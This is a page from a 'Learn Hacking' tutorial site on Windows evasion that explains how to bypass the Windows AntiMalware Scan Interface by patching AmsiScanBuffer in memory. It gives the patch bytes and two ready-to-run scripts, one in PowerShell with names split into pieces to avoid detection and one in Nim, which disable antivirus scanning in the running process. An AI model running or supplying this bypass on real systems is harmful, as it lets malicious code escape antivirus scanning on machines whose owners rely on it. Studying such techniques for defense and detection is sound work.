<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="AMSI #  This is the Windows AntiMalware Scan Interface. This is basically an interface for scanning file, processes, and more that can then be used by Windows Defender or other antivirus products.
Patching AmsiScanBuffer #  It might be as easy as patching the AmsiScanBuffer function provided by amsi.dll to return false.
The basic process here is:
 Use LoadLibrary to read amsi.dll from disk into a known variable handle."><meta name=theme-color content="#FFFFFF"><meta property="og:title" content="AMSI"><meta property="og:description" content="AMSI #  This is the Windows AntiMalware Scan Interface. This is basically an interface for scanning file, processes, and more that can then be used by Windows Defender or other antivirus products.
Patching AmsiScanBuffer #  It might be as easy as patching the AmsiScanBuffer function provided by amsi.dll to return false.
The basic process here is:
 Use LoadLibrary to read amsi.dll from disk into a known variable handle."><meta property="og:type" content="article"><meta property="og:url" content="https://brimstone.github.io/learn-hacking/docs/windows/evasion/amsi/"><meta property="article:modified_time" content="2021-04-25T20:43:48-04:00"><title>AMSI | Learn Hacking</title><link rel=manifest href=/learn-hacking/manifest.json><link rel=icon href=/learn-hacking/favicon.png type=image/x-icon><link rel=stylesheet href=/learn-hacking/book.min.f943176a5d046767dd54f2e6725b1101c9f74fbd92de0c4884cd3441e7822fba.css integrity="sha256-+UMXal0EZ2fdVPLmclsRAcn3T72S3gxIhM00QeeCL7o="><script defer src=/learn-hacking/en.search.min.44b04d4002b74603a7c94f3bcd274d1edbb41eb8bbe3b09dac8db406bfd6b9e2.js integrity="sha256-RLBNQAK3RgOnyU87zSdNHtu0Hri747CdrI20Br/WueI="></script><script defer src=/learn-hacking/sw.min.2403c3e27886e0bfb1c430c8cbbdfbb1cca624680d3c5aa34e177f9a13dd7b68.js integrity="sha256-JAPD4niG4L+xxDDIy737scymJGgNPFqjThd/mhPde2g="></script></head><body><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><nav><h2 class=book-brand><a href=/learn-hacking><span>Learn Hacking</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li class=book-section-flat><a href=/learn-hacking/docs/lab/>Lab</a><ul></ul></li><li class=book-section-flat><a href=/learn-hacking/docs/recon/>Recon</a><ul><li><a href=/learn-hacking/docs/recon/tools/>Tools</a><ul><li><a href=/learn-hacking/docs/recon/tools/nmap/>nmap</a></li></ul></li></ul></li><li class=book-section-flat><a href=/learn-hacking/docs/web/>Web</a><ul><li><span>Tools</span><ul><li><a href=/learn-hacking/docs/web/tools/burp/>Burp</a></li></ul></li><li><span>Vulnerabilies</span><ul><li><a href=/learn-hacking/docs/web/vulnerabilities/CSRF/>CSRF</a></li><li><a href=/learn-hacking/docs/web/vulnerabilities/IDOR/>IDOR</a></li><li><a href=/learn-hacking/docs/web/vulnerabilities/sqli/>SQLi</a></li><li><a href=/learn-hacking/docs/web/vulnerabilities/xss/>XSS</a></li><li><a href=/learn-hacking/docs/web/vulnerabilities/xxe/>XXE</a></li></ul></li></ul></li><li class=book-section-flat><a href=/learn-hacking/docs/linux/>Linux</a><ul></ul></li><li class=book-section-flat><a href=/learn-hacking/docs/windows/>Windows</a><ul><li><a href=/learn-hacking/docs/windows/evasion/>Evasion</a><ul><li><a href=/learn-hacking/docs/windows/evasion/amsi/ class=active>AMSI</a></li></ul></li></ul></li></ul><ul><li><a href=https://github.com/brimstone/learn-hacking target=_blank rel=noopener>Github</a></li></ul></nav><script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/learn-hacking/svg/menu.svg class=book-icon alt=Menu></label>
<strong>AMSI</strong>
<label for=toc-control><img src=/learn-hacking/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#amsi>AMSI</a><ul><li><a href=#patching-amsiscanbuffer>Patching <code>AmsiScanBuffer</code></a></li></ul></li></ul></nav></aside></header><article class=markdown><h1 id=amsi>AMSI
<a class=anchor href=#amsi>#</a></h1><p>This is the
<a href=https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal>Windows AntiMalware Scan Interface</a>. This is basically an interface for scanning file, processes, and more that can then be used by Windows Defender or other antivirus products.</p><h2 id=patching-amsiscanbuffer>Patching <code>AmsiScanBuffer</code>
<a class=anchor href=#patching-amsiscanbuffer>#</a></h2><p>It might be as easy as patching the <code>AmsiScanBuffer</code> function provided by <code>amsi.dll</code> to return false.</p><p>The basic process here is:</p><ol><li>Use <code>LoadLibrary</code> to read <code>amsi.dll</code> from disk into a known variable handle.</li><li>Use <code>GetProcAddress</code> to identify the address of the <code>AmsiScanBuffer</code> function. Since <code>amsi.dll</code> should have already been loaded into the process at process start, this should be the address to the function already active in memory.</li><li>Use <code>VirtualProtect</code> to make the memory containing the <code>AmsiScanBuffer</code> function writable (0x40 == <code>PAGE_EXECUTE_READWRITE</code>).</li><li>Just copy over the byte code for a simple replacement function.</li></ol><p>Replacement function:</p><pre><code>b8 57 00 07 80          mov    eax,0x80070057 # AMSI_RESULT_CLEAN
c3                      ret
</code></pre><p>In powershell, patching <code>AmsiScanBuffer</code> basically means calling out to a little C# code to do the heavy work of calling Win32 APIs to patch the function in the current process.</p><details><summary>Powershell Example</summary><div class=markdown-inner><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#75715e># Credit: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#patching-amsidll-amsiscanbuffer-by-rasta-mouse</span>

$Win32 = <span style=color:#e6db74>@&#34;
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>using System;
</span><span style=color:#e6db74>using System.Runtime.InteropServices;
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>public class Win32 {
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>    [DllImport(&#34;kernel32&#34;)]
</span><span style=color:#e6db74>    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>    [DllImport(&#34;kernel32&#34;)]
</span><span style=color:#e6db74>    public static extern IntPtr LoadLibrary(string name);
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>    [DllImport(&#34;kernel32&#34;)]
</span><span style=color:#e6db74>    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
</span><span style=color:#e6db74>
</span><span style=color:#e6db74>}
</span><span style=color:#e6db74>&#34;@</span>

Add-Type $Win32

$LoadLibrary = <span style=color:#66d9ef>[Win32]</span>::LoadLibrary(<span style=color:#e6db74>&#34;am&#34;</span> + <span style=color:#e6db74>&#34;si.dll&#34;</span>)
$Address = <span style=color:#66d9ef>[Win32]</span>::GetProcAddress($LoadLibrary, <span style=color:#e6db74>&#34;Amsi&#34;</span> + <span style=color:#e6db74>&#34;Scan&#34;</span> + <span style=color:#e6db74>&#34;Buffer&#34;</span>)
$p = 0
<span style=color:#66d9ef>[Win32]</span>::VirtualProtect($Address, <span style=color:#66d9ef>[uint32]5, 0x40, [ref]</span>$p)
$Patch = <span style=color:#66d9ef>[Byte[]]</span> (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
<span style=color:#66d9ef>[System.Runtime.InteropServices.Marshal]</span>::Copy($Patch, 0, $Address, 6)

</code></pre></div><p>References:</p><ul><li><a href=https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/>https://fatrodzianko.com/2020/08/25/getting-rastamouses-amsiscanbufferbypass-to-work-again/</a></li></ul></div></details><details><summary>Nim Example</summary><div class=markdown-inner><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-nim data-lang=nim><span style=color:#75715e>#[
</span><span style=color:#75715e>    Author: Marcello Salvati, Twitter: @byt3bl33d3r
</span><span style=color:#75715e>    License: BSD 3-Clause
</span><span style=color:#75715e>    Credit: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim
</span><span style=color:#75715e>]#</span>

<span style=color:#f92672>import</span> winim<span style=color:#f92672>/</span>lean
<span style=color:#f92672>import</span> strformat
<span style=color:#f92672>import</span> dynlib

<span style=color:#66d9ef>when</span> defined amd64:
    echo <span style=color:#e6db74>&#34;[*] Running in x64 process&#34;</span>
    <span style=color:#66d9ef>const</span> patch: <span style=color:#66d9ef>array</span><span style=color:#f92672>[</span><span style=color:#ae81ff>6</span>, byte<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> <span style=color:#f92672>[</span>byte <span style=color:#ae81ff>0xB8</span>, <span style=color:#ae81ff>0x57</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x07</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0xC3</span><span style=color:#f92672>]</span>
<span style=color:#66d9ef>elif</span> defined i386:
    echo <span style=color:#e6db74>&#34;[*] Running in x86 process&#34;</span>
    <span style=color:#66d9ef>const</span> patch: <span style=color:#66d9ef>array</span><span style=color:#f92672>[</span><span style=color:#ae81ff>8</span>, byte<span style=color:#f92672>]</span> <span style=color:#f92672>=</span> <span style=color:#f92672>[</span>byte <span style=color:#ae81ff>0xB8</span>, <span style=color:#ae81ff>0x57</span>, <span style=color:#ae81ff>0x00</span>, <span style=color:#ae81ff>0x07</span>, <span style=color:#ae81ff>0x80</span>, <span style=color:#ae81ff>0xC2</span>, <span style=color:#ae81ff>0x18</span>, <span style=color:#ae81ff>0x00</span><span style=color:#f92672>]</span>

<span style=color:#66d9ef>proc </span><span style=color:#a6e22e>PatchAmsi</span>(): <span style=color:#66d9ef>bool</span> <span style=color:#f92672>=</span>
    <span style=color:#66d9ef>var</span>
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: <span style=color:#66d9ef>bool</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>

    <span style=color:#75715e># loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows</span>
    <span style=color:#75715e># it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything&#39;s ok (which you can&#39;t really do well when using LoadLibrary() directly through winim)</span>
    amsi <span style=color:#f92672>=</span> loadLib(<span style=color:#e6db74>&#34;amsi&#34;</span>)
    <span style=color:#66d9ef>if</span> isNil(amsi):
        echo <span style=color:#e6db74>&#34;[X] Failed to load amsi.dll&#34;</span>
        <span style=color:#66d9ef>return</span> disabled

    cs <span style=color:#f92672>=</span> amsi.symAddr(<span style=color:#e6db74>&#34;AmsiScanBuffer&#34;</span>) <span style=color:#75715e># equivalent of GetProcAddress()</span>
    <span style=color:#66d9ef>if</span> isNil(cs):
        echo <span style=color:#e6db74>&#34;[X] Failed to get the address of &#39;AmsiScanBuffer&#39;&#34;</span>
        <span style=color:#66d9ef>return</span> disabled

    <span style=color:#66d9ef>if</span> VirtualProtect(cs, patch.len, <span style=color:#ae81ff>0x40</span>, <span style=color:#66d9ef>addr</span> op):
        echo <span style=color:#e6db74>&#34;[*] Applying patch&#34;</span>
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, <span style=color:#66d9ef>addr</span> t)
        disabled <span style=color:#f92672>=</span> <span style=color:#66d9ef>true</span>

    <span style=color:#66d9ef>return</span> disabled

<span style=color:#66d9ef>when</span> isMainModule:
    <span style=color:#66d9ef>var</span> success <span style=color:#f92672>=</span> PatchAmsi()
    echo <span style=color:#e6db74>fmt&#34;[*] AMSI disabled: {bool(success)}&#34;</span>

</code></pre></div></div></details><p><em>References:</em></p><ul><li><a href=https://onlinedisassembler.com/odaweb/majaEeX0/0>https://onlinedisassembler.com/odaweb/majaEeX0/0</a></li><li><a href=https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants>https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants</a></li><li><a href=http://pinvoke.net/default.aspx/kernel32/VirtualProtect.html>http://pinvoke.net/default.aspx/kernel32/VirtualProtect.html</a></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/brimstone/learn-hacking/commit/688c1b56e39022caf40a42c26e3b184ed063db11 title="Last modified by Matt Robinson | April 25, 2021" target=_blank rel=noopener><img src=/learn-hacking/svg/calendar.svg class=book-icon alt=Calendar>
<span>April 25, 2021</span></a></div><div><a class="flex align-center" href=https://github.com/brimstone/learn-hacking/edit/trunk/content/docs/windows/evasion/amsi.md target=_blank rel=noopener><img src=/learn-hacking/svg/edit.svg class=book-icon alt=Edit>
<span>Edit this page</span></a></div></div></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><nav id=TableOfContents><ul><li><a href=#amsi>AMSI</a><ul><li><a href=#patching-amsiscanbuffer>Patching <code>AmsiScanBuffer</code></a></li></ul></li></ul></nav></aside></main></body></html>